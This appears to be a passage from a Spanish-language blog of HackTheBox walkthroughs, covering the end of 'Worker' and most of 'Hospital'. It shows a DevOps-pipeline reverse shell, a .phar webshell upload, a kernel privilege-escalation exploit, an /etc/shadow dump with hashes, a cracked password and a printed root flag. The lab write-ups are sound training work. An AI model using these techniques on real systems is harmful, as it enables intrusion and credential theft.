<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name     SID
<span class="o">=============</span> <span class="o">==============================================</span>
worker<span class="se">\r</span>obisl S-1-5-21-3082756831-2119193761-3468718151-1330


GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                             Type             SID                                            Attributes
<span class="o">======================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">==================================================</span>
Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
WORKER<span class="se">\P</span>roduction                      Alias            S-1-5-21-3082756831-2119193761-3468718151-1018 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users        Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                   Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\L</span>ocal account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>TLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\M</span>edium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<ul>
  <li>Si recordamos tenemos credenciales y si nos conectamos al <code class="language-plaintext highlighter-rouge">devops.worker.htb</code> con las credenciales son validas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/19.png" />
</p>

<ul>
  <li>Formamos parte del grupo <code class="language-plaintext highlighter-rouge">Build Administrators</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/20.png" />
</p>

<ul>
  <li>
    <p>Podemos crear un <code class="language-plaintext highlighter-rouge">Pipeline</code>.</p>
  </li>
  <li>
    <p>Después le damos en <code class="language-plaintext highlighter-rouge">PartsUnlimited</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/21.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/22.png" />
</p>

<ul>
  <li>
    <p>Podemos hacer un script en YAML.</p>
  </li>
  <li>
    <p>Si vemos en la parte de script se están ejecutando comandos podemos hacer un <code class="language-plaintext highlighter-rouge">whoami</code> para ver quien es el que esta ejecutando el script.</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Save and Rune</code> vemos el mismo problema que teníamos antes.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/23.png" />
</p>

<ul>
  <li>Así que vamos a crear una nueva rama.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/24.png" />
</p>

<ul>
  <li>Pero obtenemos un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/25.png" />
</p>

<ul>
  <li>Vemos que nos dicen sobre el <code class="language-plaintext highlighter-rouge">pool</code> que no existe default a si que tenemos que buscar uno que exista.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/26.png" />
</p>

<ul>
  <li>Vamos a cambiar el <code class="language-plaintext highlighter-rouge">pool</code> y hacemos lo mismo de cambiar la rama.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/27.png" />
</p>

<ul>
  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Run</code> vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/28.png" />
</p>

<ul>
  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> al <code class="language-plaintext highlighter-rouge">#....</code> vemos que lo ejecuta el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/29.png" />
</p>

<ul>
  <li>
    <p>Vamos a editar el <code class="language-plaintext highlighter-rouge">Pipeline</code> para hacer todo lo anterior y enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
  <li>
    <p>En mi caso volví a subir el <code class="language-plaintext highlighter-rouge">nc.exe</code> así que nos enviamos una reverse ahora.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/30.png" />
</p>

<ul>
  <li>
    <p>Hacemos todo el proceso de antes de crear una nueva rama.</p>
  </li>
  <li>
    <p>Después de que se procese todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 49935
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
d3a78316ac7f36f03c0e6dd2ada48da9
C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Hospital (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html" rel="alternate" type="text/html" title="HackTheBox - Hospital (medium)" /><published>2024-05-12T00:00:00-06:00</published><updated>2024-05-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/e980d18b909fa0ba8f519cf9777fd413.png" />
</p>

<ul>
  <li>Hospital is a medium-difficulty Windows machine that hosts an Active Directory environment, a web server, and a RoundCube instance. The web application has a file upload vulnerability that allows the execution of arbitrary PHP code, leading to a reverse shell on the Linux virtual machine hosting the service. Enumerating the system reveals an outdated Linux kernel that can be exploited to gain root privileges, via CVE-2023-35001. Privileged access allows /etc/shadow hashes to be read and subsequently cracked, yielding credentials for the RoundCube instance. Emails on the service hint towards the use of GhostScript, which opens up the target to exploitation via , a vulnerability exploited by crafting a malicious Embedded PostScript (EPS) file to achieve remote code execution on the Windows host. System access is then obtained by either of two ways: using a keylogger to capture administrator credentials, or by abusing misconfigured XAMPP permissions.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo TCP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6616,6631,6647,9389 10.10.11.241 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-11 15:32 CST
Nmap scan report <span class="k">for </span>10.10.11.241
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-05-12 04:32:45Z<span class="o">)</span>
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-12T04:33:41+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Not valid before: 2024-05-10T04:42:39
|_Not valid after:  2024-11-09T04:42:39
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6616/tcp open  msrpc             Microsoft Windows RPC
6631/tcp open  msrpc             Microsoft Windows RPC
6647/tcp open  msrpc             Microsoft Windows RPC
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   <span class="nb">date</span>: 2024-05-12T04:33:44
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar los nombres de dominio que nos dio <code class="language-plaintext highlighter-rouge">Nmap</code> también que prácticamente son los mismos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.241 DC.hospital.htb hospital.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.241 DC.hospital.htb hospital.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.241 <span class="nt">--shares</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>-] Error enumerating shares: <span class="o">[</span>Errno 32] Broken pipe
➜  nmap cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'admin'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>-] hospital.htb<span class="se">\a</span>dmin: STATUS_LOGON_FAILURE
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.241 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Tampoco por el protocolo <code class="language-plaintext highlighter-rouge">RPC</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.241
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>En el puerto 443 vemos un panel de <code class="language-plaintext highlighter-rouge">login</code> credenciales por defecto no funcionan.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/1.png" />
</p>

<ul>
  <li>En el puerto <code class="language-plaintext highlighter-rouge">8080</code> tenemos un panel de <code class="language-plaintext highlighter-rouge">login</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/2.png" />
</p>

<ul>
  <li>
    <p>Vamos a crear una cuenta ya que no tenemos una para conectarnos.</p>
  </li>
  <li>
    <p>Una vez tenemos nuestra cuenta nos podemos conectar y algo ya que llama la atención es la parte de subir archivos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/3.png" />
</p>

<ul>
  <li>Como la pagina web interpreta <code class="language-plaintext highlighter-rouge">php</code> podemos intentar subir <code class="language-plaintext highlighter-rouge">.php</code> para ver si funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"&lt;?php system("</span><span class="nb">id</span><span class="s2">"); ?&gt;"</span> <span class="o">&gt;</span> test.php
</code></pre></div></div>

<ul>
  <li>Al subirlo me da error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/4.png" />
</p>

<ul>
  <li>
    <p>Vamos a probar con un <code class="language-plaintext highlighter-rouge">jpg</code>.</p>
  </li>
  <li>
    <p>Y funciona.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/5.png" />
</p>

<ul>
  <li>Vamos a ver si existe la ruta donde se suban las cosas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  content gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://hospital.htb:8080/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://hospital.htb:8080/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/images/]
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/uploads/]
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/css/]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/js/]
/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/vendor/]
/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/fonts/]
</code></pre></div></div>

<ul>
  <li>Y bueno lo mas probable es que no podremos ver nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/6.png" />
</p>

<ul>
  <li>
    <p>Lo que vamos hacer es capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> y ver que otras extensiones podemos usar para interpretar código <code class="language-plaintext highlighter-rouge">php</code>.</p>
  </li>
  <li>
    <p>Vamos a <code class="language-plaintext highlighter-rouge">fuzzear</code> por la extensión en el <code class="language-plaintext highlighter-rouge">intruder</code> de momento dejamos estas.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/7.png" />
</p>

<ul>
  <li>Si observamos la respuesta en <code class="language-plaintext highlighter-rouge">.phar</code> vemos que nos un <code class="language-plaintext highlighter-rouge">success.php</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/8.png" />
</p>

<blockquote>
  <p>En el software, un archivo PHAR es un formato de paquete que permite la distribución de aplicaciones y bibliotecas al agrupar muchos archivos de código PHP y otros recursos en un solo archivo.</p>
</blockquote>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>Ahora lo que vamos hacer es subir lo siguiente <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> pero lo pondremos en <code class="language-plaintext highlighter-rouge">.phar</code> para que pueda interpretarlo y así estar mas cómodos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/flozz/p0wny-shell
Cloning into <span class="s1">'p0wny-shell'</span>...
remote: Enumerating objects: 215, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>137/137<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>54/54<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 215 <span class="o">(</span>delta 94<span class="o">)</span>, reused 110 <span class="o">(</span>delta 82<span class="o">)</span>, pack-reused 78
Receiving objects: 100% <span class="o">(</span>215/215<span class="o">)</span>, 117.41 KiB | 626.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>124/124<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>p0wny-shell
➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>Dockerfile  LICENSE  README.md  RELEASE.rst  screenshot.png  shell.php
➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">mv </span>shell.php shell.phar
</code></pre></div></div>

<ul>
  <li>Después de subir el <code class="language-plaintext highlighter-rouge">.phar</code> como ya sabemos el nombre y la ruta donde guarda los archivos ya podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/9.png" />
</p>

<ul>
  <li>Ahora nos vamos enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/10.png" />
</p>

<ul>
  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6602
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>974<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@webserver:/var/www/html/uploads<span class="err">$</span>
</code></pre></div></div>

<h2 id="root">Root</h2>

<ul>
  <li>La versión del <code class="language-plaintext highlighter-rouge">kernel</code> es vieja y es vulnerable <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html/uploads<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-r</span>
5.19.0-35-generic
www-data@webserver:/var/www/html/uploads<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Al ejecutar el script nos convertiremos en <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x exploit.sh
www-data@webserver:/tmp<span class="nv">$ </span>./exploit.sh
<span class="o">[</span>+] You should be root now
<span class="o">[</span>+] Type <span class="s1">'exit'</span> to finish and leave the house cleaned
root@webserver:/tmp#
</code></pre></div></div>

<ul>
  <li>No hay nada interesante como una flag ni nada pero como somos <code class="language-plaintext highlighter-rouge">root</code> y el usuario <code class="language-plaintext highlighter-rouge">drwilliams</code> existe podemos ver el <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@webserver:/home/drwilliams# <span class="nb">cat</span> /etc/shadow

root:<span class="nv">$y$j9T$s</span>/Aqv48x449udndpLC6eC.<span class="nv">$WUkrXgkW46N4xdpnhMoax7US</span>.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:<span class="k">*</span>:19462:0:99999:7:::
bin:<span class="k">*</span>:19462:0:99999:7:::
sys:<span class="k">*</span>:19462:0:99999:7:::
<span class="nb">sync</span>:<span class="k">*</span>:19462:0:99999:7:::
games:<span class="k">*</span>:19462:0:99999:7:::
man:<span class="k">*</span>:19462:0:99999:7:::
lp:<span class="k">*</span>:19462:0:99999:7:::
mail:<span class="k">*</span>:19462:0:99999:7:::
news:<span class="k">*</span>:19462:0:99999:7:::
uucp:<span class="k">*</span>:19462:0:99999:7:::
proxy:<span class="k">*</span>:19462:0:99999:7:::
www-data:<span class="k">*</span>:19462:0:99999:7:::
backup:<span class="k">*</span>:19462:0:99999:7:::
list:<span class="k">*</span>:19462:0:99999:7:::
irc:<span class="k">*</span>:19462:0:99999:7:::
_apt:<span class="k">*</span>:19462:0:99999:7:::
nobody:<span class="k">*</span>:19462:0:99999:7:::
systemd-network:!<span class="k">*</span>:19462::::::
systemd-timesync:!<span class="k">*</span>:19462::::::
messagebus:!:19462::::::
systemd-resolve:!<span class="k">*</span>:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:<span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
root@webserver:/home/drwilliams#
</code></pre></div></div>

<h2 id="shell-as-drbrown">Shell as drbrown</h2>

<ul>
  <li>Obtenemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 512/512 AVX512BW 8x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
qwe123!@#        <span class="o">(</span>drwilliams<span class="o">)</span>
1g 0:00:01:04 DONE <span class="o">(</span>2024-05-11 16:52<span class="o">)</span> 0.01554g/s 3334p/s 3334c/s 3334C/s raycharles..pl@yboy
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Podemos usar las credenciales en el panel de administración.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/11.png" />
</p>

<ul>
  <li>Vemos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/12.png" />
</p>

<ul>
  <li>Encontramos información útil.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/13.png" />
</p>

<blockquote>
  <p>PostScript encapsulado, o EPS, es un formato de archivo gráfico. Un archivo EPS es un archivo PostScript que satisface algunas restricciones adicionales. Estas restricciones intentan hacer más fácil a programas de software el incluir un archivo EPS dentro de otro documento PostScript.</p>
</blockquote>

<ul>
  <li>El Dr. Brown quiere que le enviemos un archivo con la extensión <code class="language-plaintext highlighter-rouge">.eps</code>  y nos habla sobre <a href="https://www.ghostscript.com/">https://www.ghostscript.com/</a> que es el que interpreta el <code class="language-plaintext highlighter-rouge">PostScript</code> si investigamos sobre esto encontramos una vulnerabilidad en <code class="language-plaintext highlighter-rouge">Ghostscript</code> <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</a> en la que podemos hacer una inyección de comandos en un <code class="language-plaintext highlighter-rouge">.eps</code>.</li>
</ul>

